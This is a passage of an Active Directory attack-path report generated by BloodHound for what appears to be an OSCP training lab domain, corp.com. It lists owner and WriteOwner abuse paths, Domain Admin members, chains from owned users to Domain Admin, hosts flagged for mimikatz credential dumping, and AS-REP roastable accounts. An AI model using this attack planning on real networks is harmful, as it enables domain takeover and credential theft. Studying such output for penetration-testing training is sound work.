| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |

### ✅ WriteOwner Abuse Paths
**OSCP Relevance:** HIGH | **Results:** 69

> Find principals with WriteOwner on targets. Can take ownership, then WriteDacl, then GenericAll.

| Attacker | Victim | VictimType |
| --- | --- | --- |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DNSADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| ENTERPRISE ADMINS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ADMINISTRATORS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| ENTERPRISE ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ AddKeyCredentialLink (Shadow Credentials)
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ ForceChangePassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddMember to Privileged Groups
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Owns Relationships on Users/Groups
**OSCP Relevance:** HIGH | **Results:** 28

> Find principals who own other users or groups. Owner can grant themselves full control.

| Owner | OwnedObject | ObjectType |
| --- | --- | --- |
| ADMINISTRATORS@CORP.COM | STORAGE REPLICA ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| ADMINISTRATORS@CORP.COM | HYPER-V ADMINISTRATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | BACKUP OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN COMPUTERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE READ-ONLY DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN CONTROLLERS POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINSDHOLDER@CORP.COM | ['Base', 'Container', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN GUESTS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN USERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | JEFFADMIN@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | PRINT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN CONTROLLERS@CORP.COM | ['Base', 'OU', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | BACKUPUSER@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SERVER OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | SCHEMA ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | DEFAULT DOMAIN POLICY@CORP.COM | ['GPO', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ACCOUNT OPERATORS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ENTERPRISE KEY ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | KRBTGT@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | ADMINISTRATOR@CORP.COM | ['User', 'Base', 'Tag_Tier_Zero'] |
| DOMAIN ADMINS@CORP.COM | REPLICATORS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | CLONEABLE DOMAIN CONTROLLERS@CORP.COM | ['Group', 'Base'] |
| DOMAIN ADMINS@CORP.COM | DOMAIN ADMINS@CORP.COM | ['Group', 'Base', 'Tag_Tier_Zero'] |

### ⚪ GPO Abuse Paths
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ OU Control for Object Manipulation
**OSCP Relevance:** MEDIUM | **Results:** None

### ⚪ AllExtendedRights Enumeration
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Read LAPS Password Rights
**OSCP Relevance:** HIGH | **Results:** None

### ✅ All Domain Admins
**OSCP Relevance:** HIGH | **Results:** 3

> List all members of Domain Admins group (including nested membership). Know your targets.

| DomainAdmin | Enabled | AdminCount |
| --- | --- | --- |
| BACKUPUSER@CORP.COM | True | True |
| JEFFADMIN@CORP.COM | True | True |
| ADMINISTRATOR@CORP.COM | True | True |

### ⚪ GenericWrite on Users
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteSPN for Targeted Kerberoasting
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ WriteAccountRestrictions for RBCD
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ SyncLAPSPassword Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ AddAllowedToAct Rights
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ DCSync (Composite Check)
**OSCP Relevance:** HIGH | **Results:** None

---

## Attack Chains

### ✅ Full Attack Path: Owned User -> Pivot -> DA
**OSCP Relevance:** HIGH | **Results:** 6

> Find complete attack paths from low-privilege owned user through pivot systems to Domain Admin. Reconstructs DCSync capstone-style attack chains.

| OwnedUser | PivotMachine | Note |
| --- | --- | --- |
| DAVE@CORP.COM | CLIENT75.CORP.COM | DA has admin here - MIMIKATZ TARGET |
| DAVE@CORP.COM | CLIENT74.CORP.COM | DA has admin here - MIMIKATZ TARGET |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM | DA has admin here - MIMIKATZ TARGET |
| JEFF@CORP.COM | CLIENT74.CORP.COM | DA has admin here - MIMIKATZ TARGET |
| JEFF@CORP.COM | CLIENT75.CORP.COM | DA has admin here - MIMIKATZ TARGET |
| JEN@CORP.COM | CLIENT74.CORP.COM | DA has admin here - MIMIKATZ TARGET |

### ✅ Shortest Path to Domain Admins
**OSCP Relevance:** HIGH | **Results:** 7

> Find shortest privilege escalation path from any enabled user to Domain Admins group.

| StartUser | Hops | Path |
| --- | --- | --- |
| MEG@CORP.COM | 3 | ['MEG@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| DAVE@CORP.COM | 3 | ['DAVE@CORP.COM', 'CLIENT74.CORP.COM', 'JEFFADMIN@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| STEPHANIE@CORP.COM | 3 | ['STEPHANIE@CORP.COM', 'CLIENT74.CORP.COM', 'JEFFADMIN@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| JEFF@CORP.COM | 3 | ['JEFF@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| IIS_SERVICE@CORP.COM | 3 | ['IIS_SERVICE@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| PETE@CORP.COM | 3 | ['PETE@CORP.COM', 'DOMAIN USERS@CORP.COM', 'USERS@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |
| JEN@CORP.COM | 3 | ['JEN@CORP.COM', 'CLIENT74.CORP.COM', 'JEFFADMIN@CORP.COM', 'DOMAIN ADMINS@CORP.COM'] |

### ✅ All Paths to Domain Admin (Multi-Hop)
**OSCP Relevance:** HIGH | **Results:** 4

> Find all privilege escalation paths to Domain Admins using common attack edges. More comprehensive than shortest path.

**Attack Paths:**

1. **DAVE@CORP.COM** → **DOMAIN ADMINS@CORP.COM** (3 hops)
   - Path: DAVE@CORP.COM → CLIENT74.CORP.COM → JEFFADMIN@CORP.COM → DOMAIN ADMINS@CORP.COM
   - Edges: AdminTo → HasSession → MemberOf

2. **STEPHANIE@CORP.COM** → **DOMAIN ADMINS@CORP.COM** (3 hops)
   - Path: STEPHANIE@CORP.COM → CLIENT74.CORP.COM → JEFFADMIN@CORP.COM → DOMAIN ADMINS@CORP.COM
   - Edges: AdminTo → HasSession → MemberOf

3. **JEFF@CORP.COM** → **DOMAIN ADMINS@CORP.COM** (3 hops)
   - Path: JEFF@CORP.COM → CLIENT74.CORP.COM → JEFFADMIN@CORP.COM → DOMAIN ADMINS@CORP.COM
   - Edges: AdminTo → HasSession → MemberOf

4. **JEN@CORP.COM** → **DOMAIN ADMINS@CORP.COM** (3 hops)
   - Path: JEN@CORP.COM → CLIENT74.CORP.COM → JEFFADMIN@CORP.COM → DOMAIN ADMINS@CORP.COM
   - Edges: AdminTo → HasSession → MemberOf


### ✅ Credential Harvest Opportunities
**OSCP Relevance:** HIGH | **Results:** 6

> Find machines where you have admin AND Domain Admin has access. Prime targets for mimikatz credential dumping.

| OwnedUser | TargetMachine | Action |
| --- | --- | --- |
| DAVE@CORP.COM | CLIENT75.CORP.COM | Run mimikatz - DA creds may be cached |
| JEFF@CORP.COM | CLIENT75.CORP.COM | Run mimikatz - DA creds may be cached |
| JEN@CORP.COM | CLIENT74.CORP.COM | Run mimikatz - DA creds may be cached |
| JEFF@CORP.COM | CLIENT74.CORP.COM | Run mimikatz - DA creds may be cached |
| STEPHANIE@CORP.COM | CLIENT74.CORP.COM | Run mimikatz - DA creds may be cached |
| DAVE@CORP.COM | CLIENT74.CORP.COM | Run mimikatz - DA creds may be cached |

### Find Paths Through Specific Computer
*Skipped - requires variables: COMPUTER*

### Shortest Path Between Two Users
*Skipped - requires variables: SOURCE_USER, TARGET_USER*

### ⚪ Path to High-Value Targets
**OSCP Relevance:** HIGH | **Results:** None

### ⚪ Circular Group Memberships
**OSCP Relevance:** LOW | **Results:** None

---

## Owned Principal

### What Can Owned User Access?
*Skipped - requires variables: USER*

### Quick Wins from Owned User Context
*Skipped - requires variables: USER*

### Path to DA from Owned User
*Skipped - requires variables: USER*

### Owned User Group Memberships
*Skipped - requires variables: USER*

### Outbound Object Control from Owned
*Skipped - requires variables: USER*

### First Hop Lateral Movement
*Skipped - requires variables: USER*

### Kerberoastable from Owned Context
*Skipped - requires variables: USER*

### ✅ AS-REP Targets from Owned Context
**OSCP Relevance:** HIGH | **Results:** 1

> Find AS-REP roastable accounts. These can be attacked without any additional access.

| User | IsPrivileged | Description |
| --- | --- | --- |
| DAVE@CORP.COM | False |  |

### Session Harvest Opportunities
*Skipped - requires variables: USER*

### Chained Privilege Escalation
*Skipped - requires variables: USER*

---

## Operational

### ✅ Computers by Operating System (Find Legacy)
**OSCP Relevance:** MEDIUM | **Results:** 4

> Enumerate computers grouped by OS. Legacy systems (2008, 2003, XP) are often more vulnerable.

| OS | Computers | Count |
| --- | --- | --- |
| WINDOWS SERVER 2022 STANDARD | ['WEB04.CORP.COM', 'FILES04.CORP.COM', 'DC1.CORP.COM'] | 3 |
| WINDOWS 10 PRO | ['CLIENT76.CORP.COM'] | 1 |
| WINDOWS 11 PRO | ['CLIENT75.CORP.COM'] | 1 |
| WINDOWS 11 ENTERPRISE | ['CLIENT74.CORP.COM'] | 1 |

### ⚪ Legacy Windows Systems
**OSCP Relevance:** HIGH | **Results:** None

### ✅ Password Age Distribution
**OSCP Relevance:** MEDIUM | **Results:** 10

> Find users with old passwords. Old passwords may be weak or appear in breach databases.

| User | PasswordLastSet | IsPrivileged | Description |
| --- | --- | --- | --- |
| ADMINISTRATOR@CORP.COM | 3 years ago | True | Built-in account for administering the computer/domain |
| STEPHANIE@CORP.COM | 3 years ago | False |  |
| JEFFADMIN@CORP.COM | 3 years ago | True |  |
| JEFF@CORP.COM | 3 years ago | False |  |
| PETE@CORP.COM | 3 years ago | False |  |
| JEN@CORP.COM | 3 years ago | False |  |
| IIS_SERVICE@CORP.COM | 3 years ago | False |  |
| DAVE@CORP.COM | 3 years ago | False |  |
| MEG@CORP.COM | 1 day ago | False |  |
| BACKUPUSER@CORP.COM | 1 day ago | True |  |

### ✅ Inactive User Accounts
**OSCP Relevance:** MEDIUM | **Results:** 9

> Find enabled users who haven't logged in recently. May have default or forgotten passwords.

| User | LastLogon | Description |
| --- | --- | --- |
| PETE@CORP.COM | 2 years ago |  |
| IIS_SERVICE@CORP.COM | 2 years ago |  |
| STEPHANIE@CORP.COM | 2 years ago |  |
| JEFF@CORP.COM | 1 year ago |  |
| JEN@CORP.COM | 1 year ago |  |
| JEFFADMIN@CORP.COM | 1 year ago |  |
| MEG@CORP.COM | 1 day ago |  |
| ADMINISTRATOR@CORP.COM | 12 hours ago | Built-in account for administering the computer/domain |
| DAVE@CORP.COM | 12 hours ago |  |

### ✅ Enabled vs Disabled Account Ratio
**OSCP Relevance:** LOW | **Results:** 2

> Count enabled vs disabled accounts. High disabled count may indicate account churn.

| Enabled | Count |
| --- | --- |
| True | 10 |
| False | 2 |

### ⚪ Domain Trust Relationships
**OSCP Relevance:** MEDIUM | **Results:** None

### ✅ Relationship Count by Type
**OSCP Relevance:** LOW | **Results:** 36

> Count all relationship types in the database. Helps understand AD structure and attack surface.

| Relationship | Count |
| --- | --- |
| HAS_INDICATOR | 29812 |
| TAGGED | 14984 |
| HAS_FLAG | 5888 |
| ALTERNATIVE | 2173 |
| NEXT_STEP | 2081 |
| PREREQUISITE | 1038 |
| REFERENCES_COMMAND | 876 |
| HAS_STEP | 412 |
| GenericAll | 386 |
| EXECUTES | 348 |
| WriteDacl | 289 |
| WriteOwner | 289 |
| WriteOwnerRaw | 282 |
| GenericWrite | 221 |
| Owns | 189 |
| OwnsRaw | 184 |
| MemberOf | 112 |
| DEMONSTRATES | 106 |
| Contains | 94 |
| AddKeyCredentialLink | 56 |
| AllExtendedRights | 44 |
| TEACHES_SKILL | 30 |
| AdminTo | 24 |
| REQUIRES_SKILL | 18 |
| CanRDP | 12 |
| HasSession | 10 |
| GetChanges | 6 |
| GetChangesAll | 6 |
| GetChangesInFilteredSet | 4 |
| GPLink | 4 |
| CoerceToTGT | 4 |
| CanPSRemote | 4 |
| FROM_PLATFORM | 4 |
| ExecuteDCOM | 2 |
| EXPLOITS_CVE | 2 |
| TEACHES_TECHNIQUE | 2 |

### ✅ High-Value Target Summary
**OSCP Relevance:** HIGH | **Results:** 9

> List all objects marked as high-value in BloodHound. Primary targets for attack planning.

